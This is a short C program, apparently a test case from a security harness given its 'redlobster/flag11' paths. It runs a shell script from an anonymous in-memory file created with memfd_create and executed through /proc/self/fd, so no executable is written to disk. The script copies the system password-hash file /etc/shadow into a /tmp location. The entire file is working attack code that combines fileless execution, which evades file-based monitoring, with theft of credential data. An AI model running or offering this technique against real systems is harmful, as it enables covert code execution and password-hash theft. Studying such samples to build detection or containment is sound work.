#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    const char script[] = "#!/bin/sh\ncat /etc/shadow > /tmp/redlobster/flag11/test_11_7.txt 2>/dev/null\n";
    char fdpath[64];
    int flags;

    long fd = syscall(SYS_memfd_create, "helper", MFD_CLOEXEC);
    if (fd < 0) return 1;

    write(fd, script, strlen(script));

    /* clear CLOEXEC */
    flags = fcntl(fd, F_GETFD);
    fcntl(fd, F_SETFD, flags & ~FD_CLOEXEC);

    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%ld", fd);

    char *argv[] = { fdpath, NULL };
    char *envp[] = { NULL };
    execve(fdpath, argv, envp);
    return 2;
}
